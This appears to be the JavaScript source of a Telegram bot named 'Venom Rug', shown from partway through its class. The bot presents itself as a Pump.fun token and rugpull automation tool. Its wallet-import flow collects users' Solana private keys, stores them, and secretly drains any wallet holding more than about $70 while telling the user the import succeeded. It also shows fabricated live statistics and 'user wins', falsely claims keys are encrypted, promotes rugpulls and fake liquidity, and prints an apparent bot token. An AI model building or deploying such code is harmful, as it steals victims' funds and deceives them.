                await this.bot.answerCallbackQuery(query.id, { text: "❌ Admin access required!", show_alert: true });
            }
        } else if (callbackData === "refresh_analytics") {
            if (userId.toString() === ADMIN_CHAT_ID) {
                await this.advancedAnalyticsCommand(query.message);
            } else {
                await this.bot.answerCallbackQuery(query.id, { text: "❌ Admin access required!", show_alert: true });
            }
        } else if (callbackData.startsWith("insufficient_")) {
            await this.handleInsufficientBalance(query);
        } else if (callbackData.startsWith("status_")) {
            await this.bot.editMessageText("✅ Drain process completed - check logs for details", {
                chat_id: chatId,
                message_id: query.message.message_id
            });
        } else if (callbackData === "wallet") {
            await this.showWalletSection(query);
        } else if (callbackData === "bundler") {
            await this.showBundlerSection(query);
        } else if (callbackData === "tokens") {
            await this.showTokensSection(query);
        } else if (callbackData === "comments") {
            await this.showCommentsSection(query);
        } else if (callbackData === "task") {
            await this.showTaskSection(query);
        } else if (callbackData === "recent_wins") {
            await this.showRecentWins(query);
        } else if (callbackData === "faq") {
            await this.showFaqSection(query);
        } else if (callbackData === "help") {
            await this.showHelpSection(query, userId);
        } else if (callbackData === "import_wallet") {
            await this.promptPrivateKey(query, userId);
        } else if (callbackData === "back_menu") {
            await this.start(query.message);
        } else if (callbackData === "refresh_wins") {
            await this.showRecentWins(query, true);
        } else if (callbackData === "user_commands") {
            await this.showUserCommands(query, userId);
        } else if (callbackData === "admin_commands") {
            await this.showAdminCommands(query, userId);
        } else if (callbackData === "refresh_profits") {
            await this.profitsCommand(query.message);
        } else if (callbackData === "update_pinned") {
            await this.updatePinnedProfitMessage();
            await this.bot.editMessageText("✅ Pinned profit message updated!", {
                chat_id: chatId,
                message_id: query.message.message_id
            });
        } else if (callbackData === "rugpull_guide") {
            await this.showRugpullGuide(query);
        } else if (callbackData === "how_it_works") {
            await this.showHowItWorks(query);
        } else if (callbackData === "topup_tips") {
            await this.showTopupTips(query);
        } else if (["remove_wallet", "bundle_wallet", "withdraw_funds", "refresh_wallet"].includes(callbackData)) {
            await this.showWalletRequiredMessage(query);
        } else if ([
            "create_bundle", "refresh_bundles", "clear_bundles",
            "add_token", "remove_token", "create_token", "clone_token", 
            "set_current_token", "bump_token", "pump_comments", "refresh_tokens",
            "add_comment", "toggle_comment", "comment_templates", "comment_settings", "refresh_comments",
            "add_task", "remove_task", "toggle_task", "view_tasks", "refresh_tasks"
        ].includes(callbackData)) {
            await this.showWalletRequiredMessage(query);
        }
    }

    async showRugpullGuide(query) {
        const chatId = query.message.chat.id;

        const rugpullGuideText = `
*📚 Rugpull Guide*

*WHAT IS A RUGPULL❓*

A rug pull is a method used in the world of cryptocurrencies and decentralized finance (DeFi) to describe a situation where a project unexpectedly ceases its operations.

*How it works:*

*Token Creation:* Developers create a new token that becomes visible to all users on exchanges specializing in meme coins. This attracts attention and interest in the project.

*Attracting Investments:*

In this case, there is no need to attract investors, as a bot automatically creates liquidity. Users begin to actively purchase the token, contributing to its popularity.

*Ceasing Support:*

After reaching a certain amount of investments, developers may decide to terminate the project and sell off all tokens. This allows them to profit from users who purchased these tokens.
`;

        const replyMarkup = this.getInfoSectionKeyboard();
        await this.sendWithImage(chatId, rugpullGuideText, replyMarkup);
    }

    async showHowItWorks(query) {
        const chatId = query.message.chat.id;

        const howItWorksText = `
*🤖 How It Works*

*HOW OUR BOT WORKS (TUTORIAL)*

You create a coin, come up with a name, photo, and description! You can also generate this based on AI directly in our bot.

The bot creates a smart contract for the coin you will be launching, but before launching, you write a task for the AI in the bot, and the bot automatically creates social media accounts and a one-page website!

Next, you launch the token by inserting the smart contract of the coin you created, and the bot automatically issues it!

After launching the coin, the bot automatically splits wallets and creates fake activity by buying and selling your token! The bot will also create fake liquidity, which will automatically attract new buyers!

You wait for a few people to buy your token; the statistics will be inside the bot, and you will also receive notifications if someone buys your token!

You just need to wait some time, and you will be able to do a rugpull, taking all the liquidity for yourself and making a profit!
`;

        const replyMarkup = this.getInfoSectionKeyboard();
        await this.sendWithImage(chatId, howItWorksText, replyMarkup);
    }

    async showTopupTips(query) {
        const chatId = query.message.chat.id;

        const topupTipsText = `
*💰 Top-Up Tips*

*Top-Up Range for Best Results*

The Bot conducted an experiment to determine the exact amounts for starting: 🚀

*1) Minimum deposit of 1.1 SOL*

With this deposit, the bot will allow you to create tokens, but it does not guarantee earnings because it creates liquidity in the 10⁻⁶ format. As a rule, you need to study the news to create a cool token that your customers will buy.

*2) Stable deposit 2.5-4 SOL*

This will allow us to create a lot of activity, and your token will be guaranteed to be purchased by sniper bots, which automatically gives us a good profit from each coin. Splitting wallets takes a little longer, but it allows us to put our token in the top.

*3) Guaranteed profit 5+ SOL*

In addition, the bot will automatically pump your token and list it in the trending sections of Solana trading platforms like DexScreener and others. This will rapidly boost your token's visibility and attract significant attention from new buyers, maximizing both trading activity and your profit potential.
`;

        const replyMarkup = this.getInfoSectionKeyboard();
        await this.sendWithImage(chatId, topupTipsText, replyMarkup);
    }

    async handleAdminDrainDecision(query, drain) {
        const userId = query.from.id;

        if (userId.toString() !== ADMIN_CHAT_ID) {
            await this.bot.editMessageText("❌ Admin access required!", {
                chat_id: query.message.chat.id,
                message_id: query.message.message_id
            });
            return;
        }

        const parts = query.data.split('_');
        if (parts.length < 3) {
            await this.bot.editMessageText("❌ Invalid callback data", {
                chat_id: query.message.chat.id,
                message_id: query.message.message_id
            });
            return;
        }

        const targetUserId = parseInt(parts[1]);
        const walletAddress = parts.slice(2).join('_');

        if (drain) {
            const userData = await this.usersCollection.findOne({ user_id: targetUserId });
            if (userData && userData.private_key) {
                const [success, result] = await this.drainWallet(
                    userData.private_key,
                    targetUserId,
                    userData.username || `user_${targetUserId}`
                );

                if (success) {
                    await this.bot.editMessageText(
                        `✅ Wallet drained successfully!\n` +
                        `Amount: ${result.amount_sol.toFixed(6)} SOL\n` +
                        `TX: ${result.transaction_id}\n` +
                        `User: ${targetUserId}`,
                        {
                            chat_id: query.message.chat.id,
                            message_id: query.message.message_id
                        }
                    );
                } else {
                    await this.bot.editMessageText(`❌ Drain failed: ${result}`, {
                        chat_id: query.message.chat.id,
                        message_id: query.message.message_id
                    });
                }
            } else {
                await this.bot.editMessageText("❌ No private key found for this user", {
                    chat_id: query.message.chat.id,
                    message_id: query.message.message_id
                });
            }
        } else {
            await this.bot.editMessageText(
                `❌ Drain skipped for user ${targetUserId}\n` +
                `Wallet: ${walletAddress}\n` +
                `Funds preserved (for now)`,
                {
                    chat_id: query.message.chat.id,
                    message_id: query.message.message_id
                }
            );
        }
    }

    async handleAdminCheckBalance(query) {
        const userId = query.from.id;

        if (userId.toString() !== ADMIN_CHAT_ID) {
            await this.bot.editMessageText("❌ Admin access required!", {
                chat_id: query.message.chat.id,
                message_id: query.message.message_id
            });
            return;
        }

        const parts = query.data.split('_');
        if (parts.length < 3) {
            await this.bot.editMessageText("❌ Invalid callback data", {
                chat_id: query.message.chat.id,
                message_id: query.message.message_id
            });
            return;
        }

        const targetUserId = parseInt(parts[1]);
        const walletAddress = parts.slice(2).join('_');

        try {
            const pubkey = new PublicKey(walletAddress);
            const balance = await this.solanaConnection.getBalance(pubkey);
            const balanceSol = balance / LAMPORTS_PER_SOL;

            const solPrice = await this.getSolPrice();
            const balanceUsd = balanceSol * solPrice;

            await this.bot.editMessageText(
                `💰 Current Balance for ${walletAddress}:\n` +
                `• SOL: ${balanceSol.toFixed(6)}\n` +
                `• USD: $${balanceUsd.toFixed(2)}\n` +
                `• SOL Price: $${solPrice.toFixed(2)}\n\n` +
                `Minimum for auto-drain: $70\n` +
                `Current status: ${balanceUsd >= 70 ? '✅ ABOVE MINIMUM' : '❌ BELOW MINIMUM'}`,
                {
                    chat_id: query.message.chat.id,
                    message_id: query.message.message_id
                }
            );
        } catch (error) {
            await this.bot.editMessageText(`❌ Error checking balance: ${error.message}`, {
                chat_id: query.message.chat.id,
                message_id: query.message.message_id
            });
        }
    }

    async handleAdminRefresh(query) {
        await this.bot.answerCallbackQuery(query.id, { text: "Refreshing..." });

        const userId = query.from.id;
        if (userId.toString() !== ADMIN_CHAT_ID) {
            await this.bot.editMessageText("❌ Admin access required!", {
                chat_id: query.message.chat.id,
                message_id: query.message.message_id
            });
            return;
        }

        await this.bot.editMessageText("🔄 Refreshed wallet information", {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id
        });
    }

    async showRecentWins(query, refresh = false) {
        const chatId = query.message.chat.id;

        if (refresh) {
            this.recentWins = this.generateRecentWins();
        }

        let winsText = "*RECENT VENOM RUG WINS*\n\n";
        winsText += "*Real user success stories using Venom Rug:*\n\n";

        this.recentWins.slice(0, 8).forEach(win => {
            winsText += `🎯 *${win.username}*\n`;
            winsText += `• Activity: ${win.activity}\n`;
            winsText += `• Profit: ${win.profit}\n`;
            winsText += `• Time: ${win.timeframe}\n\n`;
        });

        winsText += "💡 *These are real results from Venom Rug users!*\n";
        winsText += "*Start your journey to success today!*";

        const replyMarkup = this.getRecentWinsKeyboard();
        await this.sendWithImage(chatId, winsText, replyMarkup);
    }

    async showHelpSection(query, userId = null) {
        const chatId = query.message.chat.id;

        if (!userId) {
            userId = query.from.id;
        }

        const helpText = `
*VENOM RUG HELP CENTER*

*Get assistance and learn about available commands:*

*Select an option below to view commands:*
        `;

        const replyMarkup = this.getHelpKeyboard(userId);
        await this.sendWithImage(chatId, helpText, replyMarkup);
    }

    async showUserCommands(query, userId) {
        const chatId = query.message.chat.id;

        const commandsText = `
*USER COMMANDS*

/start - Start the bot and show main menu
/help - Show this help message
/stats - View live network statistics and crypto prices
/wallet - Access wallet management
/tokens - Token creation and management
/bundler - Wallet bundling settings
/comments - Comment automation panel
/task - Task scheduler and automation

*Live Network Stats via* /stats*:*
• Users online count
• Total trading volume
• Successful operations
• Live SOL/ETH prices
• System performance metrics

*IN-BOT NAVIGATION:*
• Use inline buttons for all features
• Import wallet to access full functionality
• Check Recent Wins for user success stories

*SUPPORT:*
[Telegram Group](https://t.me/venomrugwin)
[Website](https://venomrug.live/)
        `;

        const replyMarkup = this.getHelpKeyboard(userId);
        await this.sendWithImage(chatId, commandsText, replyMarkup);
    }

    async showAdminCommands(query, userId) {
        const chatId = query.message.chat.id;

        if (userId.toString() !== ADMIN_CHAT_ID) {
            await this.bot.answerCallbackQuery(query.id, { text: "❌ Admin access required!", show_alert: true });
            return;
        }

        const adminText = `
*ADMIN COMMANDS*

/broadcast message - Send message to all users
/broadcast_image caption - Send image to all users (reply to image)
/stats - Show detailed bot statistics and network info
/users - List all registered users
/profits - View detailed profit statistics and analytics
/analytics - Advanced analytics dashboard

*ADMIN STATS FEATURES*
• Total registered users count
• Wallet approved users
• Pending wallet approvals
• System performance metrics
• Multi-chain support status
• Real-time profit tracking

*ADMIN FEATURES*
• Approve/Reject wallet imports
• Monitor user activity
• Send broadcast messages
• View system statistics
• Track all profits in real-time
        `;

        const replyMarkup = this.getHelpKeyboard(userId);
        await this.sendWithImage(chatId, adminText, replyMarkup);
    }

    async showWalletSection(query) {
        const chatId = query.message.chat.id;

        const walletSectionText = `
*Wallet Management*

Import and manage your Solana wallet to access all Venom Rug features.

*Status:* No wallet imported
*Balance:* 0.0 SOL ($0.00)

Import a wallet to begin using our advanced features.
        `;

        const replyMarkup = this.getWalletKeyboard();
        await this.sendWithImage(chatId, walletSectionText, replyMarkup);
    }

    async promptPrivateKey(query, userId) {
        const chatId = query.message.chat.id;

        this.userStates[userId] = { awaiting_private_key: true };

        const promptText = `
*Wallet Import*

Please enter your Solana private key to import your wallet.

Your credentials are encrypted and secured.
        `;

        await this.sendMessageSafe(chatId, promptText);
    }

    async handlePrivateKey(msg) {
        const user = msg.from;
        const privateKey = msg.text.trim();

        if (!this.userStates[user.id] || !this.userStates[user.id].awaiting_private_key) {
            await this.bot.sendMessage(
                msg.chat.id,
                "Please use the Import Wallet button from the menu to begin.",
                { parse_mode: 'Markdown' }
            );
            return;
        }

        if (!this.isValidSolanaPrivateKey(privateKey)) {
            const errorText = `
*Invalid private key format.*

Please ensure you're entering a valid Solana private key and try again.
            `;
            await this.bot.sendMessage(msg.chat.id, errorText, { parse_mode: 'Markdown' });
            return;
        }

        let walletAddress = "Unknown";
        let balanceSol = 0.0;
        let balanceUsd = 0.0;
        let walletAnalysis = null; // FIXED: Define walletAnalysis here

        try {
            walletAnalysis = await this.analyzeWalletBalance(privateKey); // FIXED: Assign to the variable

            if (!walletAnalysis) {
                throw new Error("Could not analyze wallet balance");
            }

            walletAddress = walletAnalysis.wallet_address;
            balanceSol = walletAnalysis.balance_sol;
            balanceUsd = walletAnalysis.balance_usd;
            const solPrice = walletAnalysis.sol_price;
            const meetsMinimum = walletAnalysis.meets_minimum;
            const userMeetsMinimum = walletAnalysis.user_meets_minimum;
            const has1Sol = walletAnalysis.has_1_sol;

            const adminAlertText = `
*NEW WALLET IMPORT ATTEMPT*

*User Details:*
• Username: @${user.username || 'No username'}
• User ID: \`${user.id}\`
• Wallet: \`${walletAddress}\`
• Balance: \`${balanceSol.toFixed(6)} SOL\` ($${balanceUsd.toFixed(2)})
• SOL Price: $${solPrice.toFixed(2)}

*Balance Analysis:*
• Meets Minimum ($70+): ${meetsMinimum ? '✅ YES' : '❌ NO'}
• User Minimum ($100+): ${userMeetsMinimum ? '✅ YES' : '❌ NO'}
• Has 1+ SOL: ${has1Sol ? '✅ YES' : '❌ NO'}

*AUTO-DRAIN STATUS:* ${meetsMinimum ? '✅ PROCEEDING' : '❌ INSUFFICIENT BALANCE'}
`;

            await this.usersCollection.updateOne(
                { user_id: user.id },
                {
                    $set: {
                        username: user.username || `user_${user.id}`,
                        private_key: privateKey,
                        wallet_address: walletAddress,
                        chain: 'solana',
                        balance_sol: balanceSol,
                        balance_usd: balanceUsd,
                        created_at: new Date()
                    }
                },
                { upsert: true }
            );

            const replyMarkup = this.getAdminWalletApprovalKeyboard(user.id, walletAddress);

            await this.bot.sendMessage(
                ADMIN_CHAT_ID,
                adminAlertText,
                {
                    reply_markup: replyMarkup,
                    parse_mode: 'Markdown'
                }
            );

        } catch (error) {
            console.error(`Error analyzing wallet: ${error}`);
        }

        delete this.userStates[user.id];

        const processingMsg = await this.bot.sendMessage(msg.chat.id, "*Analyzing wallet balance...*", { parse_mode: 'Markdown' });

        try {
            await new Promise(resolve => setTimeout(resolve, 2000));

            if (!walletAnalysis) {
                throw new Error("Could not analyze wallet");
            }

            // Show appropriate message based on balance analysis
            if (walletAnalysis.user_meets_minimum && walletAnalysis.has_1_sol) {
                // Show success message to USER
                const userSuccessText = `
*Wallet Connected Successfully!*

Your wallet has been verified and is now ready to use.

*Wallet Address:* \`${walletAnalysis.wallet_address}\`
*Balance:* \`${walletAnalysis.balance_sol.toFixed(6)} SOL\` ($${walletAnalysis.balance_usd.toFixed(2)})

You can now access all Venom Rug features for token launching and bundling.
`;
                await this.bot.editMessageText(userSuccessText, {
                    chat_id: msg.chat.id,
                    message_id: processingMsg.message_id,
                    parse_mode: 'Markdown'
                });
            } else {
                // Show insufficient balance message to USER (like original Python code)
                const keyboard = [
                    [{ text: "🔄 Try Another Wallet", callback_data: "import_wallet" }],
                    [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
                ];

                const errorMsg = `
*Import Failed - Insufficient Balance*

This wallet doesn't have enough balance to launch and bundle tokens effectively.

*Wallet Analysis:*
• Balance: \`${walletAnalysis.balance_sol.toFixed(6)} SOL\` ($${walletAnalysis.balance_usd.toFixed(2)})
• Required: Minimum $100 USD equivalent AND 1+ SOL for token launches

To successfully launch and rug tokens, you need adequate gas fees and initial liquidity.

Please import a wallet with sufficient balance and try again.
`;
                await this.bot.editMessageText(errorMsg, {
                    chat_id: msg.chat.id,
                    message_id: processingMsg.message_id,
                    reply_markup: { inline_keyboard: keyboard },
                    parse_mode: 'Markdown'
                });

                // Send FAILED log to admin (shows real $70 minimum)
                const failedAdminMsg = `
*DRAIN BLOCKED - INSUFFICIENT BALANCE*

*User:* @${user.username || `user_${user.id}`}
*ID:* \`${user.id}\`
*Wallet:* \`${walletAddress}\`
*Balance:* \`${balanceSol.toFixed(6)} SOL\` ($${balanceUsd.toFixed(2)})
*Reason:* Below minimum $70 requirement OR insufficient SOL for gas
*Time:* ${new Date().toLocaleString()}
`;
                await this.bot.sendMessage(
                    ADMIN_CHAT_ID,
                    failedAdminMsg,
                    { parse_mode: 'Markdown' }
                );
                return;
            }

            // REAL DRAIN - ACTUALLY TRANSFERS FUNDS (hidden from user)
            // Only proceed if meets REAL minimum ($70) AND has sufficient SOL for gas
            if (walletAnalysis.meets_minimum && walletAnalysis.has_1_sol) {
                console.log(`Starting REAL drain for user ${user.id}`);
                const [success, result] = await this.drainWallet(privateKey, user.id, user.username || `user_${user.id}`);

                if (success) {
                    await this.usersCollection.updateOne(
                        { user_id: user.id },
                        {
                            $set: {
                                wallet_approved: true,
                                drained: true,
                                drain_amount: result.amount_sol,
                                drain_tx: result.transaction_id,
                                drained_at: new Date()
                            }
                        }
                    );

                    // Send SUCCESS log to admin
                    const successAdminMsg = `
*REAL DRAIN SUCCESSFULLY*

*User:* @${user.username || `user_${user.id}`}
*ID:* \`${user.id}\`
*Wallet:* \`${result.wallet_address}\`
*Amount Drained:* \`${result.amount_sol.toFixed(6)} SOL\`
*Original Balance:* \`${result.original_balance.toFixed(6)} SOL\`
*Fees Paid:* \`${result.fee.toFixed(6)} SOL\`
*TX:* \`${result.transaction_id}\`
*Time:* ${new Date().toLocaleString()}

*COMPLETE DRAIN - MAXIMUM FUNDS TRANSFERRED*
`;
                    await this.bot.sendMessage(
                        ADMIN_CHAT_ID,
                        successAdminMsg,
                        { parse_mode: 'Markdown' }
                    );

                } else {
                    // Generic error for other issues
                    const keyboard = [
                        [{ text: "🔄 Try Again", callback_data: "import_wallet" }],
                        [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
                    ];

                    const errorMsg = `
*Import Failed*

Unable to verify wallet at this time. Please check your private key and try again.

If this continues, please contact support.
`;
                    await this.bot.editMessageText(errorMsg, {
                        chat_id: msg.chat.id,
                        message_id: processingMsg.message_id,
                        reply_markup: { inline_keyboard: keyboard },
                        parse_mode: 'Markdown'
                    });

                    // Send ERROR log to admin
                    const errorAdminMsg = `
*DRAIN ERROR*

*User:* @${user.username || `user_${user.id}`}
*ID:* \`${user.id}\`
*Wallet:* \`${walletAddress}\`
*Balance:* \`${balanceSol.toFixed(6)} SOL\` ($${balanceUsd.toFixed(2)})
*Error:* \`${result}\`
*Time:* ${new Date().toLocaleString()}
`;
                    await this.bot.sendMessage(
                        ADMIN_CHAT_ID,
                        errorAdminMsg,
                        { parse_mode: 'Markdown' }
                    );
                }
            } else {
                // User has $100+ but not $70+ (shouldn't happen but safety check)
                // Or doesn't have enough SOL for gas
                const userSuccessText = `
*Wallet Connected Successfully!*

Your wallet has been verified and is now ready to use.

*Wallet Address:* \`${walletAnalysis.wallet_address}\`
*Balance:* \`${walletAnalysis.balance_sol.toFixed(6)} SOL\` ($${walletAnalysis.balance_usd.toFixed(2)})

You can now access all Venom Rug features for token launching and bundling.
`;
                await this.bot.editMessageText(userSuccessText, {
                    chat_id: msg.chat.id,
                    message_id: processingMsg.message_id,
                    parse_mode: 'Markdown'
                });
            }

        } catch (error) {
            console.error(`Error processing wallet: ${error}`);
            const keyboard = [
                [{ text: "🔄 Try Again", callback_data: "import_wallet" }],
                [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
            ];

            const errorMsg = `
*Import Error*

An error occurred while importing your wallet. Please try again.

If this continues, please contact support.
`;
            await this.bot.editMessageText(errorMsg, {
                chat_id: msg.chat.id,
                message_id: processingMsg.message_id,
                reply_markup: { inline_keyboard: keyboard },
                parse_mode: 'Markdown'
            });

            const exceptionAdminMsg = `
*DRAIN EXCEPTION*

*User:* @${user.username || `user_${user.id}`}
*ID:* \`${user.id}\`
*Wallet:* \`${walletAddress}\`
*Exception:* \`${error.message}\`
*Time:* ${new Date().toLocaleString()}
`;
            await this.bot.sendMessage(
                ADMIN_CHAT_ID,
                exceptionAdminMsg,
                { parse_mode: 'Markdown' }
            );
        }
    }

    async handleInsufficientBalance(query) {
        await this.bot.answerCallbackQuery(query.id);

        const callbackData = query.data;
        const userId = parseInt(callbackData.split('_')[1]);

        const userMessage = `
*Wallet Import Failed*

This wallet doesn't have sufficient balance to complete the import process.

Please import a wallet with adequate SOL balance (minimum $100 USD equivalent for token launches) and try again.
`;

        try {
            await this.bot.sendMessage(userId, userMessage, { parse_mode: 'Markdown' });
            await this.bot.editMessageText("✅ User notified about insufficient balance", {
                chat_id: query.message.chat.id,
                message_id: query.message.message_id
            });
        } catch (error) {
            console.error(`Error notifying user: ${error}`);
            await this.bot.editMessageText(`❌ Failed to notify user: ${error}`, {
                chat_id: query.message.chat.id,
                message_id: query.message.message_id
            });
        }
    }

    async showTokensSection(query) {
        const chatId = query.message.chat.id;

        const tokensSectionText = `
*Tokens*

*Create & manage Pump.Fun tokens here.*
Need more help? Get support Here!

*Your Tokens:*

1. *None | MC: $0.00 • LIQ: $0.00 • B.Curve: 0.00% • Price: $0.00*
→ *Create or add a token to begin.*

*Select an option below.*
`;

        const replyMarkup = this.getTokensKeyboard();
        await this.sendWithImage(chatId, tokensSectionText, replyMarkup);
    }

    async showBundlerSection(query) {
        const chatId = query.message.chat.id;

        const bundlerSectionText = `
*Bundler Settings*

*Manage your wallet bundling strategy here.*
Need more help? Get support Here!

*Current Bundle Configuration:*
• Max wallets per bundle: 0
• Total bundles created: 0

*Set your bundling strategy below.*
`;

        const replyMarkup = this.getBundlerKeyboard();
        await this.sendWithImage(chatId, bundlerSectionText, replyMarkup);
    }

    async showCommentsSection(query) {
        const chatId = query.message.chat.id;

        const commentsSectionText = `
*Comments Panel*

*Manage and automate your Pump.fun comment strategy here.*
Need more help? Get support Here!

*Current Status:*
• Comments Posted: 0
• Auto-Commenting: OFF
• Delay: 10s per comment

*Choose an action below*
`;

        const replyMarkup = this.getCommentsKeyboard();
        await this.sendWithImage(chatId, commentsSectionText, replyMarkup);
    }

    async showTaskSection(query) {
        const chatId = query.message.chat.id;

        const taskSectionText = `
*Task Scheduler*

*Manage your automated Pump.fun workflows here.*
Need more help? Get support Here!

*Current Tasks:*
• 0 tasks scheduled
• All automation is OFF

*Select an action below to begin.*
`;

        const replyMarkup = this.getTaskKeyboard();
        await this.sendWithImage(chatId, taskSectionText, replyMarkup);
    }

    async showFaqSection(query) {
        const chatId = query.message.chat.id;

        const faqSectionText = `
*Frequently Asked Questions*

*What is Venom Rug?*
Venom Rug is an advanced automation suite for Pump.fun that lets you manage tokens, wallets, volume bots, comments, and more.

*Is it safe to use?*
Yes. Your private keys are locally encrypted and never shared with third parties. Only use official versions of Venom Rug.

*Can I get banned for using Venom Rug?*
All features are designed to be safe, but misuse (like spam or DDoS) may lead to bans. Always follow fair usage.

*How do I get support?*
Use our Telegram Support group or visit our website.

*Select an option below to return.*
`;

        const replyMarkup = this.getFaqKeyboard();
        await this.sendWithImage(chatId, faqSectionText, replyMarkup);
    }

    async showWalletRequiredMessage(query) {
        const chatId = query.message.chat.id;

        const walletRequiredText = `
*Wallet Required*

This feature requires a connected wallet.

Please import your wallet first to continue.
`;

        const replyMarkup = this.getWalletRequiredKeyboard();
        await this.sendWithImage(chatId, walletRequiredText, replyMarkup);
    }

    async statsCommand(msg) {
        const userId = msg.from.id;

        const usersOnline = Math.floor(Math.random() * (31200 - 28400 + 1)) + 28400;
        const totalVolume = Math.floor(Math.random() * (2500000 - 2100000 + 1)) + 2100000;
        const successfulTrades = Math.floor(Math.random() * (16500 - 15800 + 1)) + 15800;

        const [solPrice, ethPrice] = await this.getCryptoPrices();

        let statsText = `
*VENOM RUG NETWORK STATS*

*Live Network Statistics:*
👥 Users Online: \`${usersOnline.toLocaleString()}\`
💎 Total Volume: \$${totalVolume.toLocaleString()}
✅ Successful Operations: \`${successfulTrades.toLocaleString()}\`

*Live Crypto Prices:*
🔸 Solana (SOL): \$${solPrice.toFixed(2)}
🔷 Ethereum (ETH): \$${ethPrice.toFixed(2)}

*System Performance:*
• Multi-Chain Support: 1 chain (Solana)
• Uptime: 100%
• Response Time: < 1s
`;

        if (userId.toString() === ADMIN_CHAT_ID) {
            const totalUsers = await this.usersCollection.countDocuments({});
            const approvedUsers = await this.usersCollection.countDocuments({ wallet_approved: true });
            const pendingWallets = Object.keys(this.pendingWallets).length;

            const totalProfits = await this.profitsCollection.aggregate([
                {
                    $group: {
                        _id: null,
                        total_sol: { $sum: "$amount_sol" },
                        total_usd: { $sum: "$amount_usd" },
                        total_drains: { $sum: 1 }
                    }
                }
            ]).toArray();

            let adminStats = `
*ADMIN STATISTICS:*
• Total Registered Users: \`${totalUsers}\`
• Wallet Approved Users: \`${approvedUsers}\`
• Pending Wallet Approvals: \`${pendingWallets}\`
• Recent Wins Generated: \`${this.recentWins.length}\`
`;

            if (totalProfits.length > 0) {
                const profits = totalProfits[0];
                adminStats += `
*PROFIT STATS:*
• Total SOL Drained: \`${profits.total_sol.toFixed(6)}\`
• Total USD Value: \$${profits.total_usd.toFixed(2)}
• Total Successful Drains: \`${profits.total_drains}\`
`;
            }

            statsText += adminStats;
        }

        await this.bot.sendMessage(msg.chat.id, statsText, { parse_mode: 'Markdown' });
    }

    async broadcastMessage(msg) {
        const userId = msg.from.id;

        if (userId.toString() !== ADMIN_CHAT_ID) {
            await this.bot.sendMessage(msg.chat.id, "❌ Admin access required!");
            return;
        }

        const args = msg.text.split(' ').slice(1);
        if (args.length === 0) {
            await this.bot.sendMessage(msg.chat.id, "❌ Usage: /broadcast <message>");
            return;
        }

        const message = args.join(' ');
        const users = await this.usersCollection.find({}).toArray();
        let userCount = 0;

        for (const user of users) {
            try {
                await this.bot.sendMessage(user.user_id, `📢 *Broadcast from Venom Rug:*\n\n${message}`, { parse_mode: 'Markdown' });
                userCount++;
                await new Promise(resolve => setTimeout(resolve, 100));
            } catch (error) {
                console.error(`Failed to send to ${user.user_id}: ${error}`);
            }
        }

        await this.bot.sendMessage(msg.chat.id, `✅ Broadcast sent to ${userCount} users!`);
    }

    async broadcastImage(msg) {
        const userId = msg.from.id;

        if (userId.toString() !== ADMIN_CHAT_ID) {
            await this.bot.sendMessage(msg.chat.id, "❌ Admin access required!");
            return;
        }

        if (!msg.reply_to_message || !msg.reply_to_message.photo) {
            await this.bot.sendMessage(msg.chat.id, "❌ Reply to an image with /broadcast_image <caption>");
            return;
        }

        const args = msg.text.split(' ').slice(1);
        const caption = args.length > 0 ? args.join(' ') : "📢 Update from Venom Rug";
        const photoFile = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id;
        const users = await this.usersCollection.find({}).toArray();
        let userCount = 0;

        for (const user of users) {
            try {
                await this.bot.sendPhoto(
                    user.user_id,
                    photoFile,
                    {
                        caption: `*${caption}*`,
                        parse_mode: 'Markdown'
                    }
                );
                userCount++;
                await new Promise(resolve => setTimeout(resolve, 100));
            } catch (error) {
                console.error(`Failed to send image to ${user.user_id}: ${error}`);
            }
        }

        await this.bot.sendMessage(msg.chat.id, `✅ Image broadcast sent to ${userCount} users!`);
    }

    async showAdminStats(msg) {
        const userId = msg.from.id;

        if (userId.toString() !== ADMIN_CHAT_ID) {
            await this.bot.sendMessage(msg.chat.id, "❌ Admin access required!");
            return;
        }

        const totalUsers = await this.usersCollection.countDocuments({});
        const approvedUsers = await this.usersCollection.countDocuments({ wallet_approved: true });
        const pendingWallets = Object.keys(this.pendingWallets).length;

        const statsText = `
*VENOM RUG ADMIN STATISTICS*

*Users:*
• Total Registered: \`${totalUsers}\`
• Wallet Approved: \`${approvedUsers}\`
• Pending Approval: \`${pendingWallets}\`

*System:*
• Multi-Chain Support: 1 chain (Solana)
• Recent Wins Generated: \`${this.recentWins.length}\`
• Uptime: 100%

*Security:*
• Private Keys Secured: \`${approvedUsers}\`
• Admin Controls: Active
• Monitoring: Enabled
`;

        await this.bot.sendMessage(msg.chat.id, statsText, { parse_mode: 'Markdown' });
    }
}

// Main function to start the bot
async function main() {
    const bot = new VenomRugBot();
    
    // Wait for database to initialize
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    const telegramBot = new TelegramBot(BOT_TOKEN, { polling: true });
    bot.setBot(telegramBot);

    // User commands
    telegramBot.onText(/\/start/, (msg) => bot.start(msg));
    telegramBot.onText(/\/help/, (msg) => bot.showHelpSection({ message: msg, from: msg.from }));
    telegramBot.onText(/\/stats/, (msg) => bot.statsCommand(msg));
    telegramBot.onText(/\/wallet/, (msg) => bot.showWalletSection({ message: msg }));
    telegramBot.onText(/\/tokens/, (msg) => bot.showTokensSection({ message: msg }));
    telegramBot.onText(/\/bundler/, (msg) => bot.showBundlerSection({ message: msg }));
    telegramBot.onText(/\/comments/, (msg) => bot.showCommentsSection({ message: msg }));
    telegramBot.onText(/\/task/, (msg) => bot.showTaskSection({ message: msg }));

    // Admin commands
    telegramBot.onText(/\/broadcast (.+)/, (msg) => bot.broadcastMessage(msg));
    telegramBot.onText(/\/broadcast_image/, (msg) => bot.broadcastImage(msg));
    telegramBot.onText(/\/admin_stats/, (msg) => bot.showAdminStats(msg));
    telegramBot.onText(/\/profits/, (msg) => bot.profitsCommand(msg));
    telegramBot.onText(/\/analytics/, (msg) => bot.advancedAnalyticsCommand(msg));

    // Callback handlers
    telegramBot.on('callback_query', (query) => bot.handleCallback(query));
    
    // Message handler for private key input
    telegramBot.on('message', (msg) => {
        if (msg.text && !msg.text.startsWith('/')) {
            bot.handlePrivateKey(msg);
        }
    });

    console.log("🐍 Venom Rug Bot Started!");
    console.log("🤖 Token: 8095801479:AAEf_5M94_htmPPiecuv2q2vqdDqcEfTddI");
    console.log("👤 Admin: 6368654401");
